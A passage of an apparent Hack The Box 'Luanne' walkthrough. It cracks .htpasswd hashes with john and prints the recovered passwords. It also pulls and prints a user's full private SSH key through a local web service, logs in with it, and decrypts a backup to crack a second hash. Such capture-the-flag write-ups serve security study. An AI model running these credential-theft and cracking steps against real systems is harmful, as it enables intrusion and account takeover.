+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">$ total 20</span><br><span class="line">drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .</span><br><span class="line">drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..</span><br><span class="line">-rw-r--r--   1 root  wheel   47 Sep 16 15:07 .htpasswd</span><br><span class="line">-rw-r--r--   1 root  wheel  386 Sep 17 20:56 index.html</span><br><span class="line">-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt</span><br><span class="line">$ <span class="built_in">cat</span> .htpasswd</span><br><span class="line">webapi_user:$1$vVoNCsOl<span class="variable">$lMtBS6GL2upDbR4Owhzyc0</span></span><br></pre></td></tr></table></figure>
+
+<p>There is a webapi_user hash.</p>
+<p>Let’s try to crack it with john.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># john -w=/usr/share/wordlists/rockyou.txt hash</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">iamthebest       (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-12-04 02:01) 7.142g/s 21942p/s 21942c/s 21942C/s my3kids..ANTHONY</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>And we got the password for webapi_user:iamthebest.</p>
+<p>But the problem is su or sudo is not working</p>
+<p>Let’s use this credentials on web.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webapi_user:iamthebest</span><br></pre></td></tr></table></figure>
+
+<p>There is nothing interesting.</p>
+<p>Let’s do manually enumeration inside the box.</p>
+<p>Let’s check which service running inside the box</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -ant</span><br><span class="line">Active Internet connections (including servers)</span><br><span class="line">Proto Recv-Q Send-Q  Local Address          Foreign Address        State</span><br><span class="line">tcp        0      0  10.10.10.218.65489     10.10.14.3.9001        ESTABLISHED</span><br><span class="line">tcp        0      0  127.0.0.1.3000         127.0.0.1.65490        CLOSE_WAIT</span><br><span class="line">tcp        0      0  127.0.0.1.65490        127.0.0.1.3000         FIN_WAIT_2</span><br><span class="line">tcp        0      0  127.0.0.1.3000         *.*                    LISTEN</span><br><span class="line">tcp        0      0  127.0.0.1.3001         *.*                    LISTEN</span><br><span class="line">tcp        0      0  *.80                   *.*                    LISTEN</span><br><span class="line">tcp        0      0  *.22                   *.*                    LISTEN</span><br><span class="line">tcp        0      0  *.9001                 *.*                    LISTEN</span><br><span class="line">Active Internet6 connections (including servers)</span><br><span class="line">Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)</span><br><span class="line">tcp6       0      0  *.22                   *.*                    LISTEN</span><br><span class="line">Active UNIX domain sockets</span><br><span class="line">Address  Type   Recv-Q Send-Q    Inode     Conn     Refs  Nextref Addr</span><br><span class="line">fffff67d7a76b9e0 stream      0      0        0 fffff67d7a76b900        0        0 </span><br><span class="line">fffff67d7a76b900 stream      0      0        0 fffff67d7a76b9e0        0        0 </span><br><span class="line">fffff67d7a76b510 stream      0      0 fffff67e28af5c08        0        0        0 /var/supervisord/run/supervisord.sock.340</span><br><span class="line">fffff67d7a76bdd0 dgram       0      0        0 fffff67d7a76b3c0        0 fffff67d7a76bb30 -&gt; /var/run/log</span><br><span class="line">fffff67d7a76b7b0 dgram       0      0        0 fffff67d7a76b3c0        0        0 -&gt; /var/run/log</span><br><span class="line">fffff67d7a76b820 dgram       0      0        0        0        0        0 </span><br><span class="line">fffff67d7a76bb30 dgram       0      0        0 fffff67d7a76b3c0        0 fffff67d7a76b7b0 -&gt; /var/run/log</span><br><span class="line">fffff67d7a76b3c0 dgram       0      0 fffff67e2b920040        0 fffff67d7a76bdd0        0 /var/run/log</span><br></pre></td></tr></table></figure>
+
+<p>There is a port called 3001 that run in the localhost Let’s check this real quick.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc 127.0.0.1 3001</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">HTTP/0.9 404 Not Found</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 217</span><br><span class="line">Server: bozohttpd/20190228</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;</span><br><span class="line">/etc/passwd: &lt;pre&gt;This item has not been found&lt;/pre&gt;</span><br><span class="line">&lt;hr&gt;&lt;address&gt;&lt;a href=<span class="string">&quot;//luanne.htb:3001/&quot;</span>&gt;luanne.htb:3001&lt;/a&gt;&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Let’s curl that web server inside the machiene.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:3000/</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   199  100   199    0     0  99500      0 --:--:-- --:--:-- --:--:-- 99500</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;401 Unauthorized&lt;/h1&gt;</span><br><span class="line">/: &lt;pre&gt;No authorization&lt;/pre&gt;</span><br><span class="line">&lt;hr&gt;&lt;address&gt;&lt;a href=<span class="string">&quot;//127.0.0.1:3000/&quot;</span>&gt;127.0.0.1:3000&lt;/a&gt;&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>It said Unauthorized Let’s try those credentials which we cracked.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;title&gt;Index&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/weather/forecast?city=list&quot;</span>&gt;/weather/forecast?city=list&lt;/a&gt;</span><br><span class="line">    &lt;p&gt;&lt;h4&gt;Five day forecast (London)&lt;/h4&gt;&lt;/p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/weather/forecast?city=London&quot;</span>&gt;/weather/forecast?city=London&lt;/a&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>After some hit and try i find a way to get id_rsa file.</p>
+<p>First Let’s check &#x2F;etc&#x2F;passwd file which user has in the box.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:*:0:0:Charlie &amp;:/root:/bin/sh</span><br><span class="line">toor:*:0:0:Bourne-again Superuser:/root:/bin/sh</span><br><span class="line">daemon:*:1:1:The devil himself:/:/sbin/nologin</span><br><span class="line">operator:*:2:5:System &amp;:/usr/guest/operator:/sbin/nologin</span><br><span class="line">bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin</span><br><span class="line">games:*:7:13:&amp; pseudo-user:/usr/games:/sbin/nologin</span><br><span class="line">postfix:*:12:12:&amp; pseudo-user:/var/spool/postfix:/sbin/nologin</span><br><span class="line">named:*:14:14:&amp; pseudo-user:/var/chroot/named:/sbin/nologin</span><br><span class="line">ntpd:*:15:15:&amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin</span><br><span class="line">sshd:*:16:16:&amp; pseudo-user:/var/chroot/sshd:/sbin/nologin</span><br><span class="line">_pflogd:*:18:18:&amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin</span><br><span class="line">_rwhod:*:19:19:&amp; pseudo-user:/var/rwho:/sbin/nologin</span><br><span class="line">_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin</span><br><span class="line">_timedc:*:22:22:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_sdpd:*:23:23:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_httpd:*:24:24:&amp; pseudo-user:/var/www:/sbin/nologin</span><br><span class="line">_mdnsd:*:25:25:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_tests:*:26:26:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_tcpdump:*:27:27:&amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin</span><br><span class="line">_tss:*:28:28:&amp; pseudo-user:/var/tpm:/sbin/nologin</span><br><span class="line">_rtadvd:*:30:30:&amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin</span><br><span class="line">_unbound:*:32:32:&amp; pseudo-user:/var/chroot/unbound:/sbin/nologin</span><br><span class="line">_nsd:*:33:33:&amp; pseudo-user:/var/chroot/nsd:/sbin/nologin</span><br><span class="line">uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin</span><br><span class="line">nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin</span><br><span class="line">r.michaels:*:1000:100::/home/r.michaels:/bin/ksh</span><br><span class="line">nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin</span><br><span class="line">dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<p>try and random guess, There is a user called r.michaels.</p>
+<p>Let’s grep his id_rsa file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2610  100  2610    0     0   637k      0 --:--:-- --:--:-- --:--:--  637k</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB</span><br><span class="line">Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh</span><br><span class="line">0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ</span><br><span class="line">kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD</span><br><span class="line">ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK</span><br><span class="line">BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8</span><br><span class="line">3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE</span><br><span class="line">pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM</span><br><span class="line">3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I</span><br><span class="line">GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF</span><br><span class="line">8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb</span><br><span class="line">Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa</span><br><span class="line">POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3</span><br><span class="line">GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW</span><br><span class="line">nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm</span><br><span class="line">xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl</span><br><span class="line">7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP</span><br><span class="line">DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX</span><br><span class="line">er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n</span><br><span class="line">NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su</span><br><span class="line">o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8</span><br><span class="line">Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA</span><br><span class="line">wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6</span><br><span class="line">LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv</span><br><span class="line">+ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc</span><br><span class="line">f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO</span><br><span class="line">D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk</span><br><span class="line">N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo</span><br><span class="line">IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg</span><br><span class="line">nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq</span><br><span class="line">189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg</span><br><span class="line">QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9</span><br><span class="line">9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b</span><br><span class="line">45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>Let’s ssh inside the box.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa r.michaels@10.10.10.218</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.218 (10.10.10.218)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.218<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Last login: Fri Sep 18 07:06:51 2020</span></span><br><span class="line"><span class="string">NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to NetBSD!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">luanne$ id</span></span><br><span class="line"><span class="string">uid=1000(r.michaels) gid=100(users) groups=100(users)</span></span><br><span class="line"><span class="string">luanne$ whoami</span></span><br><span class="line"><span class="string">r.michaels</span></span><br><span class="line"><span class="string">luanne$ ls</span></span><br><span class="line"><span class="string">backups     devel       public_html user.txt</span></span><br><span class="line"><span class="string">luanne$ cat user.txt</span></span><br><span class="line"><span class="string">ea5f0ce6a917b0be1eabc7f9218febc0</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got user.txt</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb131.jpg"></li>
+</ul>
+<p>Now let me explain why ~r.michaels&#x2F;.ssh&#x2F;id_rsa is not work.</p>
+<p>If we see the r.michaels home directory there is a folder called public_html and inside this there is a id_rsa file</p>
+<p>So this folder is shared through web so we can access the public_html folder.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">backups     devel       public_html user.txt</span><br><span class="line">luanne$ <span class="built_in">cd</span> public_html/                                                                                        </span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">id_rsa</span><br></pre></td></tr></table></figure>
+
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>I found an interesting file called devel_backup-2020-09-16.tar.gz.enc inside backups on r.michaels directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">luanne$ <span class="built_in">pwd</span></span><br><span class="line">/home/r.michaels/backups</span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">devel_backup-2020-09-16.tar.gz.enc</span><br></pre></td></tr></table></figure>
+
+<p>But it’s a .enc file so we can’t extract it with tar -xf.</p>
+<p>After some google search i found a way to extract the file of .enc.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz</span><br><span class="line">signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 </span><br><span class="line">Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a </span><br><span class="line">uid              RSA 2048-bit key &lt;r.michaels@localhost&gt;</span><br><span class="line">luanne$ <span class="built_in">cd</span> /tmp</span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">devel_backup-2020-09-16.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>Now it’s a .tar.gz file so we can extract it with tar -xf.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">luanne$ <span class="built_in">cd</span> /tmp</span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">devel_backup-2020-09-16.tar.gz</span><br><span class="line">luanne$ tar -xf devel_backup-2020-09-16.tar.gz</span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">devel-2020-09-16                     devel_backup-2020-09-16.tar.gz</span><br><span class="line">luanne$ <span class="built_in">cd</span> devel-2020-09-16</span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">webapi www</span><br><span class="line">luanne$ <span class="built_in">cd</span> www</span><br><span class="line">luanne$ <span class="built_in">ls</span></span><br><span class="line">index.html</span><br><span class="line">luanne$ <span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x  2 r.michaels  wheel   96 Sep 16 15:03 .</span><br><span class="line">drwxr-x---  4 r.michaels  wheel   96 Sep 16 15:02 ..</span><br><span class="line">-rw-r--r--  1 r.michaels  wheel   47 Sep 16 18:14 .htpasswd</span><br><span class="line">-rw-r--r--  1 r.michaels  wheel  378 Sep 16 15:03 index.html</span><br><span class="line">luanne$ <span class="built_in">cat</span> .htpasswd</span><br><span class="line">webapi_user:$1<span class="variable">$6xc7I</span>/LW<span class="variable">$WuSQCS6n3yXsjPMSmwHDu</span>.</span><br></pre></td></tr></table></figure>
+
+<p>We got another hash but this is different from previous hash.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webapi_user:$1<span class="variable">$6xc7I</span>/LW<span class="variable">$WuSQCS6n3yXsjPMSmwHDu</span>.</span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to crack this hash with john.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># john -w=/usr/share/wordlists/rockyou.txt hash1</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">littlebear       (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-12-04 02:24) 16.66g/s 217600p/s 217600c/s 217600C/s jayar..hello11</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>and we got the pass</p>
